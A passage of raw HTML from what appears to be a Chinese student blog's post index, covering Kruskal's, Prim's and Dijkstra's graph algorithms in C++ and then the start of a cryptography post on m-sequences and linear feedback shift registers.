class="number">0</span>;i&lt;mgraph-&gt;arcnum;i++)&#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> j = i; j &lt; mgraph-&gt;arcnum<span class="number">-1</span>; j++)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span>(edges[i].weight&gt;edges[j+<span class="number">1</span>].weight)&#123;</span><br><span class="line">          Edges temp=edges[i];</span><br><span class="line">          edges[i]=edges[j+<span class="number">1</span>];</span><br><span class="line">          edges[j+<span class="number">1</span>]=temp;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//  for(int i=0;i&lt;mgraph-&gt;arcnum;i++)&#123;</span></span><br><span class="line">    <span class="comment">//   cout&lt;&lt;edges[i].begin&lt;&lt;&quot; &quot;&lt;&lt;edges[i].end&lt;&lt;&quot; &quot;&lt;&lt;edges[i].weight&lt;&lt;endl;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="keyword">int</span> parent[mgraph-&gt;vexnum];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;mgraph-&gt;vexnum;i++)&#123;</span><br><span class="line">        parent[i]=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> n,m;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;mgraph-&gt;arcnum;i++)&#123;</span><br><span class="line">      n=<span class="built_in">Find</span>(parent,edges[i].begin);</span><br><span class="line">      m=<span class="built_in">Find</span>(parent,edges[i].end);</span><br><span class="line">      <span class="keyword">if</span>(n!=m)&#123;</span><br><span class="line">        parent[n]=m;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;(&quot;</span>&lt;&lt;edges[i].begin&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;edges[i].end&lt;&lt;<span class="string">&quot;)&quot;</span>&lt;&lt;edges[i].weight&lt;&lt;endl;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中比较重要的是一个辅助数组，辅助数组可以找出两个节点是否为非连通图。</p><p>测试数据</p><p>0 5 10<br>2 3 12<br>1 6 14<br>1 2 16<br>3 6 18<br>3 4 22<br>4 6 24<br>4 5 25<br>0 1 28</p><p>其中parent输出的数组为<img src="/2020/11/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%9B%BE%E7%9A%84%E9%81%8D%E5%8E%86/image-20201118142019323.png" class="lazyload" data-srcset="/2020/11/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%9B%BE%E7%9A%84%E9%81%8D%E5%8E%86/image-20201118142019323.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201118142019323"><img src="/2020/11/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%9B%BE%E7%9A%84%E9%81%8D%E5%8E%86/image-20201118142251903.png" class="lazyload" data-srcset="/2020/11/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%9B%BE%E7%9A%84%E9%81%8D%E5%8E%86/image-20201118142251903.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201118142251903"></p><p>一开始parent数组全为0但，按照顺序 (0,5)可以被融入集合，此时parent[0]=5,即两点有被连接······而到了(3,6)根据算法</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//最小生成树的算法 克鲁斯卡尔(Kruskal)算法</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Find</span><span class="params">(<span class="keyword">int</span> *parent,<span class="keyword">int</span> f)</span></span>&#123;</span><br><span class="line">  <span class="keyword">while</span>(parent[f]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    f=parent[f];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> f;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当parent[f]&gt;0则代表有连通，则一直去寻找他的父节点，当(3,6)的时候此时的parent数组应为<img src="/2020/11/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%9B%BE%E7%9A%84%E9%81%8D%E5%8E%86/image-20201118142739538.png" class="lazyload" data-srcset="/2020/11/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%9B%BE%E7%9A%84%E9%81%8D%E5%8E%86/image-20201118142739538.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201118142739538">可以看到此时begin为3则直接输出3，因为它已经属于父节点，而end为6时，找到了parent[6]为3，可以看到两者的父节点相同，证明两者已经在同一个集合里面。    </p><p>运行截图：<img src="/2020/11/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%9B%BE%E7%9A%84%E9%81%8D%E5%8E%86/image-20201118143051235.png" class="lazyload" data-srcset="/2020/11/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%9B%BE%E7%9A%84%E9%81%8D%E5%8E%86/image-20201118143051235.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201118143051235"></p><h1 id="5-最小生成树-普里姆算法"><a href="#5-最小生成树-普里姆算法" class="headerlink" title="5.最小生成树 普里姆算法"></a>5.最小生成树 普里姆算法</h1><p>算法简述：从零点开始，将临接矩阵的值不断并入集合lowcast，通过遍历完全部临接矩阵的值然后最后找出最小边。</p><p>流程：假设此时的数据为<img src="/2020/11/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%9B%BE%E7%9A%84%E9%81%8D%E5%8E%86/image-20201118143709178.png" class="lazyload" data-srcset="/2020/11/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%9B%BE%E7%9A%84%E9%81%8D%E5%8E%86/image-20201118143709178.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201118143709178"></p><p>可以看到零点到所有顶点的值为[0,28,999,999,999,10,999]找出最小值为10，该点为6，所以(0,6);接下来将第6行的值也并入集合，此时lowcast的值为[0,28,999,999,25,0,999]可以看到已经有一个999被替换成999，并且adjvex中就是连接的点。</p><p> adjvex中存的是lowcast中lowcast下标顶点到adjvex中值的距离<br> 假设lowcast为[0,0,34,16,12];adjvex为[0,0,1,3,4]那么其中的34代表顶点1到2的距离为34</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//最小生成树的算法 普里姆算法</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Minitree_prim</span><span class="params">(MGraph *mgraph)</span></span>&#123;</span><br><span class="line">  <span class="comment">//min是当前的最小值，k是当前最小值的下标</span></span><br><span class="line">  <span class="keyword">int</span> min,k,j;</span><br><span class="line">  <span class="keyword">int</span> lowcoast[mgraph-&gt;vexnum];</span><br><span class="line">  <span class="keyword">int</span> adjvex[mgraph-&gt;vexnum];</span><br><span class="line">  lowcoast[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">  adjvex[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">  <span class="comment">//先将第一个节点临接节点的值赋值给该数组</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;mgraph-&gt;vexnum;i++)&#123;</span><br><span class="line">    lowcoast[i]=mgraph-&gt;matrix[<span class="number">0</span>][i];</span><br><span class="line">    adjvex[i]=<span class="number">0</span>;</span><br><span class="line">  &#125;  </span><br><span class="line"></span><br><span class="line">  <span class="comment">//从第一个节点开始，从lowcast中找出最小值</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;mgraph-&gt;vexnum;i++)&#123;</span><br><span class="line">    min=MAX;</span><br><span class="line">    j=<span class="number">0</span>;k=<span class="number">0</span>;</span><br><span class="line">    <span class="comment">//遍历出lowcast中的最小值 k为其下标</span></span><br><span class="line">    <span class="keyword">for</span>(;j&lt;mgraph-&gt;vexnum;j++)&#123;</span><br><span class="line">      <span class="keyword">if</span>(lowcoast[j]!=<span class="number">0</span>&amp;&amp;lowcoast[j]&lt;min)&#123;</span><br><span class="line">        min=lowcoast[j];</span><br><span class="line">        k=j;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//adjvex中存的是lowcast中lowcast下标顶点到adjvex中值的距离</span></span><br><span class="line">    <span class="comment">//假设lowcast为[0,0,34,16,12];adjvex为[0,0,1,3,4]那么其中的34代表顶点1到2的距离为34</span></span><br><span class="line"></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;(&quot;</span>&lt;&lt;adjvex[k]&lt;&lt;<span class="string">&quot;,&quot;</span>&lt;&lt;k&lt;&lt;<span class="string">&quot;)&quot;</span>&lt;&lt;endl;</span><br><span class="line">    lowcoast[k]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;mgraph-&gt;vexnum;j++)&#123;</span><br><span class="line">      <span class="keyword">if</span>(lowcoast[j]!=<span class="number">0</span>&amp;&amp;mgraph-&gt;matrix[k][j]&lt;lowcoast[j])&#123;</span><br><span class="line">        lowcoast[j]=mgraph-&gt;matrix[k][j];</span><br><span class="line">        adjvex[j]=k;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2020/11/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%9B%BE%E7%9A%84%E9%81%8D%E5%8E%86/image-20201118144209202.png" class="lazyload" data-srcset="/2020/11/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%9B%BE%E7%9A%84%E9%81%8D%E5%8E%86/image-20201118144209202.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201118144209202"></p><h1 id="6-最小路径算法-迪杰斯特拉算法"><a href="#6-最小路径算法-迪杰斯特拉算法" class="headerlink" title="6.最小路径算法 迪杰斯特拉算法"></a>6.最小路径算法 迪杰斯特拉算法</h1><p>算法简述：首先是S_bool数组是判断有没有被纳入集合，已经纳入集合代表着是已经存在是最短路径了。</p><p>D数组是路径大小的集合，Path数组则是记录数组下标节点的前驱节点。</p><p>第一次循环对于D数组中找到的最小值必定是可以纳入集合，假设找到的节点为5，那么就将(0,5)看成一个整体，然后判断是否需要更新D的值，如果数组的D[5]+matrix中(i,5)的距离小于D[i]，则需要更新该节点的值为D[5]+matrix中的值，并且将Path[i]的前驱节点改为5</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//最小路径算法 迪杰斯特拉算法</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ShortestPath_DIJ</span><span class="params">(MGraph* mGraph,<span class="keyword">int</span> v0)</span></span>&#123;</span><br><span class="line">  <span class="comment">//判断点是否已经纳入集合</span></span><br><span class="line">  <span class="keyword">bool</span> S_bool[mGraph-&gt;vexnum];</span><br><span class="line">  <span class="keyword">int</span> D[mGraph-&gt;vexnum];</span><br><span class="line">  <span class="comment">//前驱节点</span></span><br><span class="line">  <span class="keyword">int</span> Path[mGraph-&gt;vexnum];</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;mGraph-&gt;vexnum;i++)&#123;</span><br><span class="line">    S_bool[i]=<span class="literal">false</span>;</span><br><span class="line">    D[i]=mGraph-&gt;matrix[v0][i];</span><br><span class="line">    <span class="comment">//v0跟v之间有弧，则将v的前驱置为v0;无弧则将v的前置置为-1</span></span><br><span class="line">    <span class="keyword">if</span>(D[i]&lt;<span class="number">999</span>) Path[i]=v0;</span><br><span class="line">    <span class="keyword">else</span> Path[i]=<span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  S_bool[v0]=<span class="literal">true</span>;</span><br><span class="line">  D[v0]=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">int</span> v,min;</span><br><span class="line">  <span class="comment">//主算法</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;mGraph-&gt;vexnum;i++)&#123;</span><br><span class="line">    min=<span class="number">999</span>;</span><br><span class="line">    <span class="comment">//找出最小的边 然后记录下顶点以及min的值</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> w=<span class="number">0</span>;w&lt;mGraph-&gt;vexnum;w++)&#123;</span><br><span class="line">      <span class="keyword">if</span>(!S_bool[w]&amp;&amp;D[w]&lt;min)&#123;</span><br><span class="line">        v=w;min=D[w];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    S_bool[v]=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> w=<span class="number">0</span>;w&lt;mGraph-&gt;vexnum;w++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!S_bool[w]&amp;&amp;(D[v]+mGraph-&gt;matrix[v][w]&lt;D[w]))&#123;</span><br><span class="line">          D[w]=D[v]+mGraph-&gt;matrix[v][w];</span><br><span class="line">          Path[w]=v;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;mGraph-&gt;vexnum;i++)&#123;</span><br><span class="line">      cout&lt;&lt;D[i]&lt;&lt;<span class="string">&quot; &quot;</span>; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/11/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%9B%BE%E7%9A%84%E9%81%8D%E5%8E%86/image-20201118155926507.png" class="lazyload" data-srcset="/2020/11/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%9B%BE%E7%9A%84%E9%81%8D%E5%8E%86/image-20201118155926507.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201118155926507"></p><p><img src="/2020/11/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%9B%BE%E7%9A%84%E9%81%8D%E5%8E%86/image-20201118155935853.png" class="lazyload" data-srcset="/2020/11/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%9B%BE%E7%9A%84%E9%81%8D%E5%8E%86/image-20201118155935853.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201118155935853"></p><p>运行完成后此时的Path<img src="/2020/11/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%9B%BE%E7%9A%84%E9%81%8D%E5%8E%86/image-20201118160028042.png" class="lazyload" data-srcset="/2020/11/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%9B%BE%E7%9A%84%E9%81%8D%E5%8E%86/image-20201118160028042.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201118160028042"></p><p>可以看到0-1:28    0-1-2:44    0-1-2-3:56    0-5:10    0-5-4:35    0-1-6:42</p>]]></content>
      
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码学-m序列产生原理及其性质</title>
      <link href="/2020/11/14/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6-m%E5%BA%8F%E5%88%97%E4%BA%A7%E7%94%9F%E5%8E%9F%E7%90%86%E5%8F%8A%E5%85%B6%E6%80%A7%E8%B4%A8/"/>
      <url>/2020/11/14/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6-m%E5%BA%8F%E5%88%97%E4%BA%A7%E7%94%9F%E5%8E%9F%E7%90%86%E5%8F%8A%E5%85%B6%E6%80%A7%E8%B4%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="m序列的简介"><a href="#m序列的简介" class="headerlink" title="m序列的简介"></a>m序列的简介</h1><p>1、m序列是<strong>最长线性移位寄存器序列</strong>的简称。顾名思义，m序列是由多级移位寄存器或其延迟元件通过线性反馈产生的最长的码序列。在二进制移位寄存器中，若n为移位寄存器的级数，n级移位寄存器共有 2n 个状态，除去全0状态外还剩下 2n-1 中状态，因此它能产生的最大长度的码序列为 2n-1 位，也就是说，一个n级线性反馈移位寄存器产生的最长周期等于 2n-1 。在码分多址系统中主要采用两种长度的m序列：一种是周期为 215-1的m序列，又称短PN序列；另一种是周期为242-1的m序列，又称为长PN码序列。</p><p>2、m序列是一种基本又典型的伪随机序列。在通信领域有着广泛的应用，如扩频通信、卫星通信的码分多址（CDMA），数字数据中的加密、加扰、同步、误码率测量等领域。</p><h1 id="m序列的产生原理"><a href="#m序列的产生原理" class="headerlink" title="m序列的产生原理"></a>m序列的产生原理</h1><p>图(1)示出的是由n级移位寄存器构成的码序列发生器。寄存器的状态决定于时钟控制下输入的信息（“0”或“1”），例如第I级移位寄存器状态决定于前一时钟脉冲后的第i－1级移位寄存器的状态。<br>图中C0，C1，…，Cn均为反馈线，其中C0＝C1＝1，表示反馈连接。因为m序列是由循环序列发生器产生的，因此C0和Cn肯定为1，即参与反馈。而反馈系数C1，C2，…，Cn－1，若为1，参与反馈；若为0，则表示断开反馈线，即开路，无反馈连线。</p><p><img src="/2020/11/14/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6-m%E5%BA%8F%E5%88%97%E4%BA%A7%E7%94%9F%E5%8E%9F%E7%90%86%E5%8F%8A%E5%85%B6%E6%80%A7%E8%B4%A8/image-20201114135921497.png" class="lazyload" data-srcset="/2020/11/14/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6-m%E5%BA%8F%E5%88%97%E4%BA%A7%E7%94%9F%E5%8E%9F%E7%90%86%E5%8F%8A%E5%85%B6%E6%80%A7%E8%B4%A8/image-20201114135921497.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201114135921497"></p><p>一个线性反馈移动寄存器能否产生m序列，决定于它的反馈系数Ci ( i=0,1,2,…n) ，下表中列出了部分m序列的反馈系数 ，按照下表中的系数来构造移位寄存器，就能产生相应的m序列。</p><p><strong>选择合适的反馈函数可使序列的周期达到最大值2的n次方-1，周期达到最大值的序列称为m序列</strong></p><img src="/2020/11/14/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6-m%E5%BA%8F%E5%88%97%E4%BA%A7%E7%94%9F%E5%8E%9F%E7%90%86%E5%8F%8A%E5%85%B6%E6%80%A7%E8%B4%A8/image-20201114140021652.png" class="lazyload" data-srcset="/2020/11/14/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6-m%E5%BA%8F%E5%88%97%E4%BA%A7%E7%94%9F%E5%8E%9F%E7%90%86%E5%8F%8A%E5%85%B6%E6%80%A7%E8%B4%A8/image-20201114140021652.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201114140021652" style="zoom:50%;"><p>根据表1中的八进制的反馈系数，可以确定m序列发生器的结构。以7级m序列反馈系数Ci=(211)8为例，首先将八进制的系数转化为二进制的系数即Ci=(010001001)2，由此我们可以得到各级反馈系数分别为：C0=1，C1=0，C2=0，C3=0，C4=1，C5=0，C6=0，C7=1，由此就很容易地构造出相应的m序列发生器。根据反馈系数，其他级数的m序列的构造原理与上述方法相同。</p><h1 id="m序列的产生和本原多项式"><a href="#m序列的产生和本原多项式" class="headerlink" title="m序列的产生和本原多项式"></a>m序列的产生和本原多项式</h1><p>由n级串联的移位寄存器和反馈逻辑线路可组成动态移位寄存器，如果反馈逻辑线路只由模2和构成，则称为线性反馈移位寄存器。带线性反馈逻辑的移位寄存器设定初始状态后，在时钟触发下，每次移位后各级寄存器会发生变化，其中任何一级寄存器的输出，随着时钟节拍的推移都会产生一个序列，该序列称为移位寄存器序列。n级线性移位寄存器如下图所示：<img src="/2020/11/14/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6-m%E5%BA%8F%E5%88%97%E4%BA%A7%E7%94%9F%E5%8E%9F%E7%90%86%E5%8F%8A%E5%85%B6%E6%80%A7%E8%B4%A8/image-20201114141754088.png" class="lazyload" data-srcset="/2020/11/14/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6-m%E5%BA%8F%E5%88%97%E4%BA%A7%E7%94%9F%E5%8E%9F%E7%90%86%E5%8F%8A%E5%85%B6%E6%80%A7%E8%B4%A8/image-20201114141754088.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201114141754088"></p><p><img src="/2020/11/14/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6-m%E5%BA%8F%E5%88%97%E4%BA%A7%E7%94%9F%E5%8E%9F%E7%90%86%E5%8F%8A%E5%85%B6%E6%80%A7%E8%B4%A8/image-20201114142039117.png" class="lazyload" data-srcset="/2020/11/14/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6-m%E5%BA%8F%E5%88%97%E4%BA%A7%E7%94%9F%E5%8E%9F%E7%90%86%E5%8F%8A%E5%85%B6%E6%80%A7%E8%B4%A8/image-20201114142039117.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201114142039117"></p><h1 id="生成函数的性质"><a href="#生成函数的性质" class="headerlink" title="生成函数的性质"></a>生成函数的性质</h1><p><img 